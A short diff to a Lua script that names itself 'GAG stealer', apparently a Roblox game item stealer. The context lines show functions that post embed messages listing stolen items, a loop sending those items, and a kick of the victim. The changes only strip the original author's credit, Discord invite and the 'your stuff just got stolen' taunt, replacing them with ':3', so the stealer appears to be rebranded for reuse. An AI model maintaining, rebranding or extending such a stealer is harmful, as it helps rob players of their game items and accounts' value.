@@ -175,7 +175,7 @@ local function SendJoinMessage(list, prefix)
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"
+                ["text"] = "-#:3"
             }
         }}
     }
@@ -234,7 +234,7 @@ local function SendMessage(sortedItems)
             ["color"] = 65280,
 			["fields"] = fields,
 			["footer"] = {
-				["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"
+				["text"] = "-#:3"
 			}
         }}
     }
@@ -350,7 +350,7 @@ if #itemsToSend > 0 then
             task.wait(0.1)
         end
 
-        plr:kick("All your stuff just got stolen by Tobi's stealer!\n Join discord.gg/GY2RVSEGDT")
+        plr:kick(":3")
     end
 
     local function waitForUserChat()
